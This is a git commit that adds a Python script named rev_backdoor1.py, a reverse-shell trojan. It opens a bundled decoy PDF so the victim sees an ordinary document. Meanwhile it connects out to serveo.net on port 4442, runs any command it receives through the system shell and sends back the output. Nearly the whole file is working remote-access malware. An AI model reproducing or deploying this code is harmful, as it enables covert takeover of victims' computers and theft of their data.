cfe69fa984bc97cff83aa37856b97131b27062f4
TEJ PRAKASH AGARWAL <49359890+Tej4401@users.noreply.github.com>
2019-08-25 18:45:48 +0530

    Add files via upload

---
+++ rev_backdoor1.py
@@ -0,0 +1,36 @@
+import socket, subprocess, os, sys
+file_name = sys._MEIPASS + "\Kreyszig.pdf"
+subprocess.Popen(file_name, shell=True)
+def cd1(path):
+    os.chdir(path)
+    msg = os.getcwd()
+    return msg
+def execute(command):
+    DEVNULL = open(os.devnull, 'wb')
+    return subprocess.check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL)
+connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+try:
+    connection.connect(("serveo.net", 4442))
+except socket.error:
+    pass
+else:
+    rcvd = "[+] connection established"
+    while rcvd != "quit":
+        rcvd = (connection.recv(1024)).decode()
+        if rcvd != "quit":
+            try:
+                check=rcvd.split(" ")
+                if check[0] == "cd":
+                    # res=(check[1]).encode()
+                    DEVNULL = open(os.devnull, 'wb')
+                    n=os.chdir(check[1],stderr=DEVNULL, stdin=DEVNULL)
+                    res = (os.getcwd()).encode()
+                    # res=check[1].encode()
+                else:
+                    res = execute(rcvd)
+            except:
+                pass
+            else:
+                connection.send(res)                            
+    connection.close()
+    sys.exit(0)
